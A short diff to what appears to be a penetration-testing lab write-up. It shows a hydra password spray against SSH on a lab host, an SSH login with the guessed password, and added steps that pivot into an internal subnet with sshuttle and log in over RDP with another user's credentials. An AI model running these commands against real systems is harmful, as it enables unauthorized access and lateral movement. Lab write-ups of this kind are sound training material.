@@ -29,3 +29,15 @@ hydra -L usernames.txt -p 'Texas123!@#' ssh://10.129.234.116
 ```shell
 ssh jbetty@IP -p Texas123!@#
 ```
+
+I looked for lots of attack vector 
+
+
+We have to set a stablished connection with the internal network
+
+```shell
+sshuttle -r jbetty@10.129.234.116 172.16.119.0/24 -v
+# In other terminal
+# ping is disabled but rdp no
+xfreerdp /v:172.16.119.7 /u:hwilliam /dynamic-resolution /p:dealer-screwed-gym1 
+```
